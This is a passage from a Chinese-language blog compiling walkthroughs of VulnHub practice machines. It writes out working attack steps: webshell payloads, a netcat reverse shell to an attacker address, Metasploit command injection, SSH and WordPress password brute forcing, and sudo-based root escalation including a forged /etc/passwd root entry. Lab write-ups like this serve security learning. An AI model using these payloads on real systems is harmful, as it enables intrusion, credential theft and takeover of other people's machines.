<p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/01.png" alt="" /></p>
<h2 id="web路径扫描-18"><a class="markdownIt-Anchor" href="#web路径扫描-18"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.1.107/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/02.png" alt="" /></p>
<h2 id="漏洞利用-35"><a class="markdownIt-Anchor" href="#漏洞利用-35"></a> 漏洞利用</h2>
<p>收集smb信息<br />
<code>enum4linux 192.168.1.107</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/03.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/04.png" alt="" /></p>
<p>目录/anonymous可以匿名访问，使用空账户即可登入<br />
且获得用户名<code>aeolus</code>，<code>cronus</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/05.png" alt="" /></p>
<p>下载并查看<code>log.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/06.png" alt="" /></p>
<p>内容为smb.conf与proftpd.conf<br />
smb的<code>/anonymous</code>路径对应<code>/home/aeolus/share/</code><br />
ftp存在匿名访问</p>
<p>尝试匿名访问FTP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.1068.1.107</span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/07.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/08.png" alt="" /></p>
<p>通过smb服务获取shadow的备份文件</p>
<p>使用john破解Hash</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/09.png" alt="" /></p>
<p>得到账户信息<code>aeolus:sergioteamo</code></p>
<p>使用账户信息登入SSH</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/10.png" alt="" /></p>
<h2 id="权限提升-35"><a class="markdownIt-Anchor" href="#权限提升-35"></a> 权限提升</h2>
<p>查看系统信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/11.png" alt="" /></p>
<p>查看网络端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -antlp</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/12.png" alt="" /></p>
<p>目标对本地开放25，3306，8080端口</p>
<p>使用nc探测本地8080端口</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/13.png" alt="" /></p>
<p>本地8080端口存在Web服务</p>
<p>进行端口转发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp;</span><br></pre></td></tr></table></figure>
<p>使用浏览器访问目标1235端口</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/14.png" alt="" /></p>
<p>使用<code>aeolus</code>账户进行登入</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/15.png" alt="" /></p>
<p>查询相关漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit librenms</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/16.png" alt="" /></p>
<p>使用MSF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_inject</span><br><span class="line">set RHOST 192.168.1.107</span><br><span class="line">set RPORT 1235</span><br><span class="line">set USERNAME aeolus</span><br><span class="line">set PASSWORD sergioteamo</span><br><span class="line">set LHOST 192.168.1.103</span><br><span class="line">set LPORT 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/17.png" alt="" /></p>
<p>获取tty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/18.png" alt="" /></p>
<p>进行sudo提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root mysql -e &#39;\! &#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/19.png" alt="" /></p>
<hr />
<blockquote>
<p>ProFRPd 1.3.5 mod_copy</p>
</blockquote>
<p>该模块允许未授权用户进行任意文件拷贝操作，配合SMB访问以及已知SMB路径即可完成任意文件下载/上传操作<br />
该模块也存在写入Webshell的操作，具体操作如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.barradell-johns.com/index.php/2019/08/25/symfonos-two-writeup/">WalkThrough</a><br />
<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37262">写入WebShell</a></p>
</blockquote>
<hr />
<h1 id="fishymail"><a class="markdownIt-Anchor" href="#fishymail"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/fishymail-1,583/">FishyMail</a></h1>
<p><code>2020/11/04 20:52:24</code></p>
<h2 id="寻找靶机ip-20"><a class="markdownIt-Anchor" href="#寻找靶机ip-20"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/00.png" alt="" /></p>
<h2 id="端口扫描-36"><a class="markdownIt-Anchor" href="#端口扫描-36"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n</code></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/01.png" alt="" /></p>
<h2 id="web路径扫描-19"><a class="markdownIt-Anchor" href="#web路径扫描-19"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.1.103/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/02.png" alt="" /></p>
<h2 id="漏洞利用-36"><a class="markdownIt-Anchor" href="#漏洞利用-36"></a> 漏洞利用</h2>
<p>访问 <code>http://192.168.1.103:8080/robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;spongebob</span><br><span class="line">&#x2F;dataentry</span><br><span class="line">&#x2F;fishymailer</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/03.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/04.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/05.png" alt="" /></p>
<p>继续枚举目录 <code>/dataentry/</code> 下的路劲</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/06.png" alt="" /></p>
<p>枚举目录 <code>/dataentry/backup/admin/files/</code> 下的文件</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/07.png" alt="" /></p>
<p>访问 <code>http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/08.png" alt="" /></p>
<p>对内容进行解码</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/09.png" alt="" /></p>
<p>构造字典进行SSH爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat words1</span><br><span class="line">spongebob</span><br><span class="line">Sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">chocolateflavoredWATER</span><br><span class="line">dirtysalmon </span><br><span class="line">chinook</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">pearl</span><br><span class="line">krabs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/10.png" alt="" /></p>
<p>使用 <code>squidward</code> 账户登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh squidward@192.168.1.103 -p 2600</span><br><span class="line">0ctopus</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/11.png" alt="" /></p>
<h2 id="权限提升-36"><a class="markdownIt-Anchor" href="#权限提升-36"></a> 权限提升</h2>
<p>查看信息<br />
<code>cat /BikiniBottom-db.sql</code></p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/12.png" alt="" /></p>
<p>进行Base64解码</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/13.png" alt="" /></p>
<p>在线MD5解密</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/14.png" alt="" /></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spongebob:sandy</span><br><span class="line">squidward:0ctopus</span><br><span class="line">patrick:</span><br><span class="line">dirtysalmon:crabby4eva</span><br><span class="line">Sandy:astronaut</span><br></pre></td></tr></table></figure>
<p>构造字典进行SSH爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat words2</span><br><span class="line">spongebob</span><br><span class="line">sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">dirtysalmon</span><br><span class="line">crabby4eva</span><br><span class="line">Sandy</span><br><span class="line">astronaut</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/15.png" alt="" /></p>
<p>使用账户 <code>dirtysalmon</code> 登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh dirtysalmon@192.168.1.103 -p 2600</span><br><span class="line">crabby4eva</span><br></pre></td></tr></table></figure>
<p>查看系统信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">OpenBSD fishymail.Home 6.6 GENERIC#353 amd64</span><br></pre></td></tr></table></figure>
<p>搜索相关提权漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openbsd 6</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/16.png" alt="" /></p>
<p>进行提权操作</p>
<p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/17.png" alt="" /></p>
<hr />
<blockquote>
<p>ksh</p>
</blockquote>
<p>squidward账户受到了ksh的限制，很多命令无法执行，尝试过切换成/bin/sh，但是无法实现</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://grumpygeekwrites.wordpress.com/2020/10/27/fishymail-1-vulnhub-walk-through/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="hemisphere-lynx"><a class="markdownIt-Anchor" href="#hemisphere-lynx"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hemisphere-lynx,577/">Hemisphere: Lynx</a></h1>
<p><code>2020/11/06 23:22:46</code></p>
<h2 id="寻找靶机ip-21"><a class="markdownIt-Anchor" href="#寻找靶机ip-21"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/00.png" alt="" /></p>
<h2 id="端口扫描-37"><a class="markdownIt-Anchor" href="#端口扫描-37"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/01.png" alt="" /></p>
<h2 id="web路径扫描-20"><a class="markdownIt-Anchor" href="#web路径扫描-20"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.56.104/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/02.png" alt="" /></p>
<h2 id="漏洞利用-37"><a class="markdownIt-Anchor" href="#漏洞利用-37"></a> 漏洞利用</h2>
<p>枚举smb服务相关信息<br />
<code>enum4linux 192.168.56.104</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/03.png" alt="" /></p>
<p>得到用户名 <code>johannes</code></p>
<p>访问 <code>http://192.168.56.104</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/04.png" alt="" /></p>
<p>获取网站文本内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass</span><br></pre></td></tr></table></figure>
<p>进行SSH爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.56.104   login: johannes   password: constelaciones</span><br></pre></td></tr></table></figure>
<p>得到账户 <code>johannes:constelaciones</code></p>
<p>登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh johannes@192.168.56.104</span><br><span class="line">constelaciones</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-37"><a class="markdownIt-Anchor" href="#权限提升-37"></a> 权限提升</h2>
<p>查看桌面保存的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds </span><br><span class="line">MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>进行Base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d</span><br><span class="line">20Kl7iS1KCaniO8DWMzh:toor</span><br></pre></td></tr></table></figure>
<p>逆序输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;</span><br><span class="line">root:hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure>
<p>切换到root用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="colddbox-easy"><a class="markdownIt-Anchor" href="#colddbox-easy"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/colddbox-easy,586/">ColddBox: Easy</a></h1>
<p><code>2020/11/06 13:06:15</code></p>
<h2 id="寻找靶机ip-22"><a class="markdownIt-Anchor" href="#寻找靶机ip-22"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/00.png" alt="" /></p>
<h2 id="端口扫描-38"><a class="markdownIt-Anchor" href="#端口扫描-38"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106</code></p>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/01.png" alt="" /></p>
<h2 id="web路径扫描-21"><a class="markdownIt-Anchor" href="#web路径扫描-21"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.56.106/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/02.png" alt="" /></p>
<h2 id="漏洞利用-38"><a class="markdownIt-Anchor" href="#漏洞利用-38"></a> 漏洞利用</h2>
<p>使用wpscan进行用户名枚举</p>
<p><code>wpscan --url http://192.168.56.106 -e u</code></p>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/03.png" alt="" /></p>
<p>使用wpscan进行账户爆破</p>
<p><code>wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/04.png" alt="" /></p>
<p>使用账户 <code>c0ldd:9876543210</code> 进行登入<br />
<code>http://192.168.56.106/wp-login.php</code></p>
<p>登入之后进行修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Appearance -&gt; Editor -&gt; 404.php</span><br></pre></td></tr></table></figure>
<p>插入PHPShell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>验证Shell<br />
访问 <code>http://192.168.56.106/?p=2&amp;cmd=whoami</code> ，得到回显 <code>www-data</code></p>
<p>监听端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure>
<p>反弹Shell<br />
访问<br />
<code>http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff</code></p>
<h2 id="权限提升-38"><a class="markdownIt-Anchor" href="#权限提升-38"></a> 权限提升</h2>
<p>查看数据库配置信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/05.png" alt="" /></p>
<p>得到数据库账户 <code>c0ldd:cybersecurity</code></p>
<p>尝试使用该账户登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh c0ldd@192.168.56.106</span><br><span class="line">cybersecurity</span><br></pre></td></tr></table></figure>
<p>登入成功</p>
<p>查看SUDO权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/07.png" alt="" /></p>
<p>生成Hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.</span><br></pre></td></tr></table></figure>
<p>以root身份修改文件 <code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>插入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>切换至账户 <code>test</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure>
<p>即可获得root权限</p>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://sevenlayers.com/index.php/377-vulnhub-colddbox-easy-walkthrough">WalkThrough</a></p>
</blockquote>
<hr />
<p>EOF</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>xXxYOLOxXx
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/" title="Vulnhub_Walkthrough_Set">https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
              <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/" rel="prev" title="光的波粒二象性理论与存在即被感知理论的联系分析">
      <i class="fa fa-chevron-left"></i> 光的波粒二象性理论与存在即被感知理论的联系分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/08/Pentest-With-Meterpreter/" rel="next" title="Pentest With Meterpreter">
      Pentest With Meterpreter <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#os-hacknos-1"><span class="nav-number">1.</span> <span class="nav-text"> Os-hackNos-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.2.</span> <span class="nav-text"> Web路径枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#os-hacknos-2"><span class="nav-number">2.</span> <span class="nav-text"> Os-hackNos-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="nav-number">2.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE-2"><span class="nav-number">2.2.</span> <span class="nav-text"> Web路径枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">2.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2"><span class="nav-number">2.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#os-hacknos-3"><span class="nav-number">3.</span> <span class="nav-text"> Os-hackNos-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-3"><span class="nav-number">3.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE-3"><span class="nav-number">3.2.</span> <span class="nav-text"> Web路径枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">3.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3"><span class="nav-number">3.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item 